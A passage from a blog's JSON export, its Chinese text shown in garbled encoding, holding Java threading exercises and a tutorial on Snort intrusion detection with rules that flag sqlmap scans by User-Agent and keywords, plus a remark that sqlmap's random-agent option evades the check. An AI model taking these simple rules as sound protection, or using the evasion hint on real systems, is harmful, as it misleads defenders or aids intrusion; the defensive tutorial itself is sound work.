e.printStackTrace();\n    }\n}\n\n}</code></pre></li>\n</ul>\n<h2 id=\"six-chapter\"><a href=\"#six-chapter\" class=\"headerlink\" title=\"six_chapter\"></a>six_chapter</h2><ul>\n<li><p>å¤šçº¿ç¨‹æ‰“å°çº¿ç¨‹å·</p>\n<pre><code>package sixth_chapter;\n\n/**\n * @author brian\n *\n * @date: 2019å¹´12æœˆ1æ—¥ ä¸‹åˆ7:50:35\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\npublic class SecondThread implements Runnable{\n\n    /**\n     * @param args\n     */\n    public void run() {\n        for(int i=0;i&lt;5;i++) {\n\n            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+(char)(i+&apos;A&apos;));\n            try {\n                Thread.sleep(700);\n            }\n            catch(InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    public static void main(String[] args) {\n        // TODO Auto-generated method stub\n\n    }\n\n}</code></pre></li>\n</ul>\n<pre><code>package sixth_chapter;\n//import FitstThread;\n//import SecondThread;\n\n/**\n * @author brian\n *\n * @date: 2019å¹´12æœˆ1æ—¥ ä¸‹åˆ7:19:12\n *\n * @description: TODO\n *\n * @version: V1.0\n *\n */\n\n\npublic class test_4 {\n\n    /**\n     * @param args\n     */\n    public static void main(String[] args) {\n        // TODO Auto-generated method stub\n        Runnable target = new SecondThread();\n        Thread t1 = new Thread(target);\n        Thread t2 = new Thread(target);\n        for(int i=0;i&lt;10;i++) {\n            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+i);\n            try {\n                Thread.sleep(700);\n            }\n            catch(InterruptedException e) {\n                e.printStackTrace();\n            }\n            if(i==1) t1.start();\n            if(i==2) t2.start();\n        }\n    }\n\n}</code></pre><ul>\n<li>çº¿ç¨‹äº’æ–¥</li>\n</ul>\n","text":"java-tests11/26/2019 9:26:49 AM charper twoè¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¾“å‡ºé˜¶ä¹˜æœ€å³è¾¹çš„é0æ•°å­—package the_second_chapter;import java.math.BigInteger;import java.util.Scanne","link":"","raw":null,"photos":[],"categories":[{"name":"java","slug":"java","count":1,"path":"api/categories/java.json"}],"tags":[{"name":"java's things","slug":"java-s-things","count":1,"path":"api/tags/java-s-things.json"}]},{"title":"snort å®‰å…¨é˜²å¾¡","slug":"snort-å®‰å…¨é˜²å¾¡","date":"2019-11-24T14:57:59.000Z","updated":"2019-12-01T12:57:42.268Z","comments":true,"path":"api/articles/snort-å®‰å…¨é˜²å¾¡.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"å®‰å…¨é˜²å¾¡-snort\"><a href=\"#å®‰å…¨é˜²å¾¡-snort\" class=\"headerlink\" title=\"å®‰å…¨é˜²å¾¡-snort\"></a>å®‰å…¨é˜²å¾¡-snort</h1><p>Snort IDSï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚å®ƒå…·æœ‰å®æ—¶æ•°æ®æµé‡åˆ†æå’Œè®°å½•IPç½‘ç»œæ•°æ®åŒ…çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿè¿›è¡Œåè®®åˆ†æï¼Œå¯¹ç½‘ç»œæ•°æ®åŒ…å†…å®¹è¿›è¡Œæœç´¢/åŒ¹é…ã€‚å®ƒèƒ½å¤Ÿæ£€æµ‹å„ç§ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼Œå¯¹æ”»å‡»è¿›è¡Œå®æ—¶æŠ¥è­¦ã€‚æ­¤å¤–ï¼ŒSnortæ˜¯å¼€æºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå¹¶å…·æœ‰å¾ˆå¥½çš„æ‰©å±•æ€§å’Œå¯ç§»æ¤æ€§ã€‚</p>\n<h2 id=\"Snort-ç®€ä»‹\"><a href=\"#Snort-ç®€ä»‹\" class=\"headerlink\" title=\"Snort ç®€ä»‹\"></a>Snort ç®€ä»‹</h2><h3 id=\"snortä½“ç³»ç»“æ„\"><a href=\"#snortä½“ç³»ç»“æ„\" class=\"headerlink\" title=\"snortä½“ç³»ç»“æ„\"></a>snortä½“ç³»ç»“æ„</h3><p>Snortçš„ç»“æ„ç”±4å¤§è½¯ä»¶æ¨¡å—ç»„æˆï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p>\n<ol>\n<li>æ•°æ®åŒ…å—…æ¢æ¨¡å—â€”â€”è´Ÿè´£ç›‘å¬ç½‘ç»œæ•°æ®åŒ…ï¼Œå¯¹ç½‘ç»œè¿›è¡Œåˆ†ï¼›</li>\n<li>é¢„å¤„ç†æ¨¡å—â€”â€”è¯¥æ¨¡å—ç”¨ç›¸åº”çš„æ’ä»¶æ¥æ£€æŸ¥åŸå§‹æ•°æ®åŒ…ï¼Œä»ä¸­å‘ç°åŸå§‹æ•°æ®çš„â€œè¡Œä¸ºâ€ï¼Œå¦‚ç«¯å£æ‰«æï¼ŒIPç¢ç‰‡ç­‰ï¼Œæ•°æ®åŒ…ç»è¿‡é¢„å¤„ç†åæ‰ä¼ åˆ°æ£€æµ‹å¼•æ“ï¼›</li>\n<li>æ£€æµ‹æ¨¡å—â€”â€”è¯¥æ¨¡å—æ˜¯Snortçš„æ ¸å¿ƒæ¨¡å—ã€‚å½“æ•°æ®åŒ…ä»é¢„å¤„ç†å™¨é€è¿‡æ¥åï¼Œæ£€æµ‹å¼•æ“ä¾æ®é¢„å…ˆè®¾ç½®çš„è§„åˆ™æ£€æŸ¥æ•°æ®åŒ…ï¼Œä¸€æ—¦å‘ç°æ•°æ®åŒ…ä¸­çš„å†…å®¹å’ŒæŸæ¡è§„åˆ™ç›¸åŒ¹é…ï¼Œå°±é€šçŸ¥æŠ¥è­¦æ¨¡å—ï¼›</li>\n<li>æŠ¥è­¦/æ—¥å¿—æ¨¡å—â€”â€”ç»æ£€æµ‹å¼•æ“æ£€æŸ¥åçš„Snortæ•°æ®éœ€è¦ä»¥æŸç§æ–¹å¼è¾“å‡ºã€‚å¦‚æœæ£€æµ‹å¼•æ“ä¸­çš„æŸæ¡è§„åˆ™è¢«åŒ¹é…ï¼Œåˆ™ä¼šè§¦å‘ä¸€æ¡æŠ¥è­¦ï¼Œè¿™æ¡æŠ¥è­¦ä¿¡æ¯ä¼šé€šè¿‡ç½‘ç»œã€UNIXsocketã€WindowsPopu(SMB)ã€SNMPåè®®çš„trapå‘½ä»¤ä¼ é€ç»™æ—¥å¿—æ–‡ä»¶ï¼Œç”šè‡³å¯ä»¥å°†æŠ¥è­¦ä¼ é€ç»™ç¬¬ä¸‰æ–¹æ’ä»¶ï¼ˆå¦‚SnortSamï¼‰ï¼Œå¦å¤–æŠ¥è­¦ä¿¡æ¯ä¹Ÿå¯ä»¥è®°å…¥SQLæ•°æ®åº“ã€‚</li>\n</ol>\n<h3 id=\"snortä¸‰ç§å·¥ä½œæ–¹å¼\"><a href=\"#snortä¸‰ç§å·¥ä½œæ–¹å¼\" class=\"headerlink\" title=\"snortä¸‰ç§å·¥ä½œæ–¹å¼\"></a>snortä¸‰ç§å·¥ä½œæ–¹å¼</h3><p>Snortæ‹¥æœ‰ä¸‰å¤§åŸºæœ¬åŠŸèƒ½ï¼šå—…æ¢å™¨ã€æ•°æ®åŒ…è®°å½•å™¨å’Œå…¥ä¾µæ£€æµ‹ã€‚</p>\n<ol>\n<li>å—…æ¢å™¨æ¨¡å¼ä»…ä»ç½‘ç»œä¸Šè¯»å–æ•°æ®åŒ…å¹¶ä½œä¸ºè¿ç»­ä¸æ–­çš„æµæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šï¼Œå¸¸ç”¨å‘½ä»¤snort -vã€‚ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å°†ä½¿snortåªè¾“å‡ºIP/TCP/UDP/ICMPçš„åŒ…å¤´ä¿¡æ¯</li>\n<li>æ•°æ®åŒ…è®°å½•å™¨æ¨¡å¼æ˜¯æŠŠæ•°æ®åŒ…è®°å½•åˆ°ç¡¬ç›˜ä¸Šï¼Œå¸¸ç”¨å‘½ä»¤snort â€“l æŒ‡å®šä¸€ä¸ªç›®å½•ã€‚è¿™ä¼šå°†æ‰€æœ‰çš„åŒ…è®°å½•åˆ°ç¡¬ç›˜ä¸Šã€‚</li>\n<li>ç½‘ç»œå…¥ä¾µæ£€æµ‹æ¨¡å¼æ˜¯æœ€å¤æ‚çš„ï¼Œè€Œä¸”æ˜¯å¯é…ç½®çš„ã€‚æˆ‘ä»¬å¯ä»¥è®©Snortåˆ†æç½‘ç»œæ•°æ®æµä»¥åŒ¹é…ç”¨æˆ·å®šä¹‰çš„ä¸€äº›è§„åˆ™ï¼Œå¹¶æ ¹æ®æ£€æµ‹ç»“æœé‡‡å–ä¸€å®šçš„åŠ¨ä½œã€‚</li>\n</ol>\n<h2 id=\"å¦‚ä½•ä½¿ç”¨0x01\"><a href=\"#å¦‚ä½•ä½¿ç”¨0x01\" class=\"headerlink\" title=\"å¦‚ä½•ä½¿ç”¨0x01\"></a>å¦‚ä½•ä½¿ç”¨0x01</h2><h3 id=\"snort-è§„åˆ™å®šä¹‰\"><a href=\"#snort-è§„åˆ™å®šä¹‰\" class=\"headerlink\" title=\"snort è§„åˆ™å®šä¹‰\"></a>snort è§„åˆ™å®šä¹‰</h3><p>Snortä½¿ç”¨ä¸€ç§ç®€å•çš„è§„åˆ™æè¿°è¯­è¨€ï¼Œè¿™ç§æè¿°è¯­è¨€æ˜“äºæ‰©å±•ï¼ŒåŠŸèƒ½ä¹Ÿæ¯”è¾ƒå¼ºå¤§ã€‚<br>Snortè§„åˆ™æ˜¯åŸºäºæ–‡æœ¬çš„ï¼Œè§„åˆ™æ–‡ä»¶æŒ‰ç…§ä¸åŒçš„ç»„è¿›è¡Œåˆ†ç±»ï¼Œæ¯”å¦‚ï¼Œæ–‡ä»¶<code>ftp.rules</code>åŒ…å«äº†FTPæ”»å‡»å†…å®¹ã€‚<br>ã€Œæ³¨ã€Snortçš„æ¯æ¡è§„åˆ™å¿…é¡»åœ¨ä¸€è¡Œä¸­ï¼Œå®ƒçš„è§„åˆ™è§£é‡Šå™¨æ— æ³•å¯¹è·¨è¡Œçš„è§„åˆ™è¿›è¡Œè§£æã€‚Snortçš„æ¯æ¡è§„åˆ™éƒ½å¯ä»¥åˆ†æˆé€»è¾‘ä¸Šçš„ä¸¤ä¸ªéƒ¨åˆ†ï¼š<strong>è§„åˆ™å¤´å’Œè§„åˆ™ä½“</strong>ã€‚</p>\n<p>è§„åˆ™å¤´åŒ…æ‹¬4ä¸ªéƒ¨åˆ†ï¼š<strong>è§„åˆ™è¡Œä¸ºï¼›åè®®ï¼›æºä¿¡æ¯ï¼›ç›®çš„ä¿¡æ¯</strong>ã€‚</p>\n<p>snortè§„åˆ™å¤´Snorté¢„ç½®çš„è§„åˆ™åŠ¨ä½œæœ‰5ç§ï¼š</p>\n<ol>\n<li>passâ€”åŠ¨ä½œé€‰é¡¹passå°†å¿½ç•¥å½“å‰çš„åŒ…ï¼Œåç»§æ•è·çš„åŒ…å°†è¢«ç»§ç»­åˆ†æã€‚</li>\n<li>logâ€”åŠ¨ä½œé€‰é¡¹logå°†æŒ‰ç…§è‡ªå·±é…ç½®çš„æ ¼å¼è®°å½•åŒ…ã€‚</li>\n<li>alertâ€”åŠ¨ä½œé€‰é¡¹alertå°†æŒ‰ç…§è‡ªå·±é…ç½®çš„æ ¼å¼è®°å½•åŒ…ï¼Œç„¶åè¿›è¡ŒæŠ¥è­¦ã€‚å®ƒçš„åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯å¿…é¡»æ°å½“çš„ç”¨ï¼Œå› ä¸ºå¦‚æœæŠ¥è­¦è®°å½•è¿‡å¤šï¼Œä»ä¸­æ”«å–æœ‰æ•ˆä¿¡æ¯çš„å·¥ä½œé‡å¢å¤§ï¼Œåè€Œä¼šä½¿å®‰å…¨é˜²æŠ¤å·¥ä½œå˜å¾—ä½æ•ˆã€‚</li>\n<li>dynamicâ€”åŠ¨ä½œé€‰é¡¹dynamicæ˜¯æ¯”è¾ƒç‹¬ç‰¹çš„ä¸€ç§ï¼Œå®ƒä¿æŒåœ¨ä¸€ç§æ½œä¼çŠ¶æ€ï¼Œç›´åˆ°activateç±»å‹çš„è§„åˆ™å°†å…¶è§¦å‘ï¼Œä¹‹åå®ƒå°†åƒlogåŠ¨ä½œä¸€æ ·è®°å½•æ•°æ®åŒ…ã€‚</li>\n<li>activateâ€”åŠ¨ä½œé€‰é¡¹activateåŠŸèƒ½å¼ºå¤§ï¼Œå½“è¢«è§„åˆ™è§¦å‘æ—¶ç”ŸæˆæŠ¥è­¦ï¼Œå¹¶å¯åŠ¨ç›¸å…³çš„dynamicç±»å‹è§„åˆ™ã€‚åœ¨æ£€æµ‹å¤æ‚çš„æ”»å‡»ï¼Œæˆ–å¯¹æ•°æ®è¿›è¡Œå½’ç±»æ—¶ï¼Œè¯¥åŠ¨ä½œé€‰é¡¹ç›¸å½“æœ‰ç”¨ã€‚é™¤äº†ä»¥ä¸Š5ç§é¢„ç½®çš„è§„åˆ™åŠ¨ä½œç±»å‹ï¼Œç”¨æˆ·è¿˜å¯ä»¥å®šåˆ¶è‡ªå·±çš„ç±»å‹ã€‚</li>\n</ol>\n<p>è§„åˆ™ä½“çš„ä½œç”¨æ˜¯åœ¨è§„åˆ™å¤´ä¿¡æ¯çš„åŸºç¡€ä¸Šè¿›ä¸€æ­¥åˆ†æï¼Œæœ‰äº†å®ƒæ‰èƒ½ç¡®è®¤å¤æ‚çš„æ”»å‡»(Snortçš„è§„åˆ™å®šä¹‰ä¸­å¯ä»¥æ²¡æœ‰è§„åˆ™ä½“)ã€‚è§„åˆ™ä½“ç”±è‹¥å¹²ä¸ªè¢«åˆ†åˆ«éš”å¼€çš„ç‰‡æ–­ç»„æˆï¼Œæ¯ä¸ªç‰‡æ–­å®šä¹‰äº†ä¸€ä¸ªé€‰é¡¹å’Œç›¸åº”çš„é€‰é¡¹å€¼ã€‚ä¸€éƒ¨åˆ†é€‰é¡¹æ˜¯å¯¹å„ç§åè®®çš„è¯¦ç»†è¯´æ˜ï¼ŒåŒ…æ‹¬IPã€ICMPå’ŒTCPåè®®ï¼Œå…¶ä½™çš„é€‰é¡¹æ˜¯ï¼šè§„åˆ™è§¦å‘æ—¶æä¾›ç»™ç®¡ç†å‘˜çš„å‚è€ƒä¿¡æ¯ï¼Œè¢«æœç´¢çš„å…³é”®å­—ï¼ŒSnortè§„åˆ™çš„æ ‡è¯†å’Œå¤§å°å†™ä¸æ•æ„Ÿé€‰é¡¹ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªè§„åˆ™å®ä¾‹ã€‚</p>\n<pre><code>alert tcp !192.168.43.0/24 any -&gt;any 21 (content:&quot;USER&quot;;msg: &quot;FTP Login&quot;;)</code></pre><ol>\n<li><code>alert</code>è¡¨ç¤ºè§„åˆ™åŠ¨ä½œä¸ºæŠ¥è­¦ã€‚                                         </li>\n<li><code>tcp</code>è¡¨ç¤ºåè®®ç±»å‹ä¸ºTCPåè®®ã€‚ </li>\n<li><code>!192.168.0.1/24</code>è¡¨ç¤ºæºIPåœ°å€ä¸æ˜¯192.168.0.1/24ã€‚ </li>\n<li>ç¬¬ä¸€ä¸ª<code>any</code>è¡¨ç¤ºæºç«¯å£ä¸ºä»»æ„ç«¯å£ã€‚                            </li>\n<li><code>-&gt;</code>è¡¨ç¤ºå‘é€æ–¹å‘æ“ä½œç¬¦ï¼Œæ–¹å‘æ“ä½œç¬¦å·¦è¾¹çš„ipåœ°å€å’Œç«¯å£å·è¢«è®¤ä¸ºæ˜¯æµæ¥è‡ªçš„æºä¸»æœº</li>\n<li>ç¬¬äºŒä¸ªanyè¡¨ç¤ºç›®çš„IPåœ°å€ä¸ºä»»æ„IPåœ°å€ã€‚</li>\n<li>21è¡¨ç¤ºç›®çš„ç«¯å£ä¸º21ã€‚ </li>\n<li><code>content:&quot;USER&quot;</code>è¡¨ç¤ºåŒ¹é…çš„å­—ç¬¦ä¸²ä¸ºâ€œUSERâ€ã€‚      </li>\n<li><code>msg:&quot;FTPLogin&quot;</code>è¡¨ç¤ºæŠ¥è­¦ä¿¡æ¯ä¸ºâ€œFTPLoginâ€</li>\n</ol>\n<p>é¢„å¤„ç†å™¨åœ¨è°ƒç”¨æ£€æµ‹å¼•æ“ä¹‹å‰ï¼Œåœ¨æ•°æ®åŒ…è¢«è§£ç ä¹‹åè¿è¡Œã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼ŒSnortå¯ä»¥ä»¥ä¸€ç§<code>out of band</code>çš„æ–¹å¼å¯¹æ•°æ®åŒ…è¿›è¡Œä¿®æ”¹æˆ–è€…åˆ†æã€‚<br>é¢„å¤„ç†å™¨å¯ä»¥ä½¿ç”¨<code>preprocessor</code>å…³é”®è¯æ¥åŠ è½½å’Œé…ç½®ï¼Œå¸¸ç”¨åˆ°çš„é¢„å¤„ç†å™¨å¦‚ä¸‹:</p>\n<ol>\n<li><code>HTTPdecode</code>é¢„å¤„å™¨HTTPè§£ç é¢„å¤„ç†æ¨¡å—ç”¨æ¥å¤„ç†HTTPURLå­—ç¬¦ä¸²ï¼ŒæŠŠå®ƒä»¬è½¬æ¢ä¸ºæ¸…æ™°çš„ASCIIå­—ç¬¦ä¸²ã€‚</li>\n<li>ç«¯å£æ‰«æå™¨<code>portscan</code>ç«¯å£æ‰«æå™¨ä¼šæŠŠç”±å•ä¸ªæºIPåœ°å€å‘èµ·çš„ç«¯å£æ‰«æä»å¼€å§‹åˆ°ç»“æŸçš„å…¨è¿‡ç¨‹è®°å½•åˆ°æ ‡å‡†æ—¥å¿—ã€‚</li>\n<li><code>stream</code>å¤„ç†å™¨streamå¤„ç†å™¨ä¸ºsnortæä¾›äº†TCPæ•°æ®åŒ…é‡ç»„çš„åŠŸèƒ½ã€‚åœ¨é…ç½®çš„ç«¯å£ä¸Šï¼Œstreamå¤„ç†å™¨èƒ½å¤Ÿå¯¹TCPæ•°æ®åŒ…çš„ç»†å°ç‰‡æ®µè¿›è¡Œé‡ç»„ï¼Œä½¿ä¹‹æˆä¸ºå®Œæ•´çš„TCPæ•°æ®åŒ…ï¼Œç„¶åsnortå¯ä»¥å¯¹å…¶å¯ç–‘è¡Œä¸ºè¿›è¡Œæ£€æŸ¥ã€‚</li>\n<li><code>frag2</code>å¤„ç†å™¨frag2é¢„å¤„ç†å™¨ä¸ºsnortæä¾›äº†IPåˆ†ç‰‡é‡ç»„çš„åŠŸèƒ½ã€‚frag2é¢„å¤„ç†å™¨èƒ½å¤Ÿå¯¹åˆ†ç‰‡åŒ…è¿›è¡Œé‡ç»„æ¥å®šä½åˆ†ç‰‡æ”»å‡»ï¼Œå®ƒçš„å·¥ä½œåŸç†æ˜¯å°†æ‰€æœ‰çš„åˆ†ç‰‡é‡ç»„æ„é€ æˆä¸€ä¸ªåŒ…å«å®Œæ•´ä¿¡æ¯çš„æ•°æ®åŒ…ï¼Œå†å°†è¿™ä¸ªåŒ…ä¼ ç»™æ£€æµ‹å¼•æ“ã€‚</li>\n</ol>\n<h3 id=\"ç¼–å†™è§„åˆ™\"><a href=\"#ç¼–å†™è§„åˆ™\" class=\"headerlink\" title=\"ç¼–å†™è§„åˆ™\"></a>ç¼–å†™è§„åˆ™</h3><p>æˆ‘ä»¬åœ¨ä½¿ç”¨å¼€å§‹å‰ä¸€å®šè¦æ³¨æ„é€‰æ‹©å¥½ç½‘å¡ï¼Œåœ¨snort.exeæ–‡ä»¶æ‰€åœ¨ç›®å½•ç”¨<code>snort -W</code>æŸ¥çœ‹ç³»ç»Ÿå¯ç”¨ç½‘ç»œæ¥å£ã€‚è®°ä½éœ€è¦ç›‘è§†çš„ç½‘å¡çš„ç¼–å·ï¼Œæ¯”å¦‚ä¸º2ï¼Œé‚£ä¹ˆåœ¨ä»¥åçš„ä½¿ç”¨ä¸­ï¼Œç”¨<code>-i 2</code>å°±å¯ä»¥é€‰æ‹©å¯¹åº”çš„ç½‘å¡ã€‚</p>\n<p>æˆ‘ä»¬å…ˆæ–°å»ºè§„åˆ™</p>\n<pre><code>alert icmp any any -&gt; 192.168.43.137 any (msg:ï¼‚ICMP PINGï¼‚;sid:10000)</code></pre><p>ipåœ°å€æ˜¯æˆ‘çš„ä¸»æœºipã€‚è¿™æ¡è§„åˆ™çš„æ„æ€å°±æ˜¯ å¯¹æ¥è‡ªä»»ä½•åœ°å€çš„<code>icmp</code>æ•°æ®åŒ…å‘å‡ºè­¦å‘Šä¿¡æ¯.</p>\n<p>æ‰§è¡Œå‘½ä»¤ï¼š</p>\n<pre><code>snort -i 2 -c ../etc/snort.conf -l ./log</code></pre><p>æˆ‘ä»¬å°†ç¼–å†™çš„è§„åˆ™å†™å…¥<code>snort.conf</code>ä¸­ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦ <code>-c</code> æ¥æŒ‡å®šæˆ‘ä»¬ç”¨çš„è§„åˆ™ï¼Œå¹¶å°†æ—¥å¿—è®°å½•åˆ° log æ–‡ä»¶åŠ ä¸­ã€‚</p>\n<p>æ—¥å¿—æ˜¯äºŒè¿›åˆ¶ä¿å­˜çš„ï¼Œå¯¹äºæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶æˆ‘ä»¬éœ€è¦æ‰§è¡Œ</p>\n<pre><code>snort -dvr snort.log.xxxx</code></pre><h2 id=\"å¦‚ä½•ä½¿ç”¨0x02\"><a href=\"#å¦‚ä½•ä½¿ç”¨0x02\" class=\"headerlink\" title=\"å¦‚ä½•ä½¿ç”¨0x02\"></a>å¦‚ä½•ä½¿ç”¨0x02</h2><h3 id=\"ä½¿ç”¨-snort-æ£€æµ‹å±€åŸŸç½‘å†…-sqlmap-è¡Œä¸º\"><a href=\"#ä½¿ç”¨-snort-æ£€æµ‹å±€åŸŸç½‘å†…-sqlmap-è¡Œä¸º\" class=\"headerlink\" title=\"ä½¿ç”¨ snort æ£€æµ‹å±€åŸŸç½‘å†… sqlmap è¡Œä¸º\"></a>ä½¿ç”¨ snort æ£€æµ‹å±€åŸŸç½‘å†… sqlmap è¡Œä¸º</h3><p>å…ˆç¼–å†™è§„åˆ™</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;sqlmap&quot;;sid=10000;classtype:webscan;rev=1)</code></pre><p>åœ¨ <code>classification.conf</code> ä¸­æ·»åŠ  webscan ç±»å‹çš„è§„åˆ™</p>\n<pre><code>config classfiction æè¿°ï¼Œæè¿°ï¼Œå±é™©ç­‰çº§\nconfig classification:shortname,short description,priority\nconfig classification: webscan,webscan sqlmap,1</code></pre><p>åœ¨ <code>sid-msg.map</code> ä¸­æ·»åŠ é¢„å®šä¹‰æè¿°</p>\n<pre><code>10000 || webscan sqlmap detected || mcafee,98775</code></pre><p>æœ¬åœ°èµ· dvwa ä¹‹åä½¿ç”¨ low çº§åˆ«çš„ sqlæ³¨å…¥ ï¼Œå°†payloadæ”¾å…¥sqlmapï¼Œéšåæ‰“å¼€snortè¿›è¡Œç›‘å¬å‘ç°äº†sqlmapè¡Œä¸ºã€‚</p>\n<p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨é—®é¢˜ï¼Œsnort åœ¨UAå¤´é‡Œæ£€æµ‹åˆ°äº† sqlmap å­—ç¬¦ä¸²ï¼Œç„¶åæ‰“å°äº†è­¦å‘Šä¿¡æ¯ï¼Œè¿™æ ·çš„æ£€æµ‹ä¸å¤Ÿä¸¥è°¨ï¼Œå› ä¸ºæˆ‘ä»¬å¦‚æœåœ¨ sql æ³¨å…¥çš„åœ°æ–¹å¡«å…¥sqlmapå®ƒåŒæ ·ä¼šè§¦å‘ snort è­¦å‘Šã€‚</p>\n<p>æˆ‘ä»¬ä¿®æ”¹åŸæ¥çš„è§„åˆ™ä¸º</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;User-Agent: sqlmap/&quot;;sid=10000;classtype:webscan;rev=2)</code></pre><p>æ­¤æ—¶æˆ‘ä»¬å°±èƒ½é’ˆå¯¹ UA å¤´è¿›è¡Œç›‘æµ‹(revä¹ŸåŠ ä¸€ï¼Œè·Ÿä¹‹å‰çš„è®°å½•è¿›è¡ŒåŒºåˆ†)ã€‚</p>\n<p>ä½†æ˜¯ sqlmap å…¶å®å¯ä»¥ç»•è¿‡ UA å¤´çš„æ£€æµ‹ï¼Œæˆ‘ä»¬åœ¨ sqlmap ä¸­æ·»åŠ  <code>random-agent</code> å‚æ•°ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸åŒçš„ UA ã€‚</p>\n<p>å¦å¤–ï¼Œåœ¨ä½¿ç”¨è§„åˆ™æ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ·»åŠ å¤šä¸ª content æ¥è¿›è¡Œæ£€æµ‹ï¼š</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;and&quot;;content:&quot;=&quot;;sid=10001;classtype:webscan;rev=2)</code></pre><p>è¿™æ ·åœ¨åŒ¹é…åˆ°ä¸¤ä¸ªå…³é”®è¯æ—¶å°±ä¼šè§¦å‘è­¦å‘Šã€‚</p>\n<p>å¯¹äºå…¶ä»–çš„æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®æ—¥å¿—æ¥æŠ“å–ä¸åŒçš„è¯·æ±‚ï¼Œç„¶åæ·»åŠ åˆ°å¯¹åº”çš„è§„åˆ™é‡Œã€‚</p>\n<p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ¶å®šä¸€ä¸ªä¾æ®è®¿é—®é¢‘ç‡çš„è§„åˆ™ï¼š</p>\n<pre><code>alert any any -&gt; any any (msg:&quot;too many access&quot;;content:&quot;192.168.10.132/login.php&quot;;detection_filter:count 3, second 300,track by_src;sid=10002;classtype:webscan;rev=1)</code></pre><p>è¿™æ ·5åˆ†é’Ÿå†…å‘å‡ºä¸‰æ¬¡è¯·æ±‚å°±ä¼šè¢«æ£€æµ‹åˆ°ã€‚</p>\n","text":"å®‰å…¨é˜²å¾¡-snortSnort IDSï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚å®ƒå…·æœ‰å®æ—¶æ•°æ®æµé‡åˆ†æå’Œè®°å½•IPç½‘ç»œæ•°æ®åŒ…çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿè¿›è¡Œåè®®åˆ†æï¼Œå¯¹ç½‘ç»œæ•°æ®åŒ…å†…å®¹è¿›è¡Œæœç´¢/åŒ¹é…ã€‚å®ƒèƒ½å¤Ÿæ£€æµ‹å„ç§ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼Œå¯¹æ”»å‡»è¿›è¡Œå®æ—¶æŠ¥è­¦ã€‚æ­¤å¤–ï¼ŒSnortæ˜¯å¼€æºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå¹¶å…·æœ‰å¾ˆ","link":"","raw":null,"photos":[],"categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","count":5,"path":"api/categories/æ¸—é€æµ‹è¯•.json"}],"tags":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","count":3,"path":"api/tags/æ¸—é€æµ‹è¯•.json"}]}]}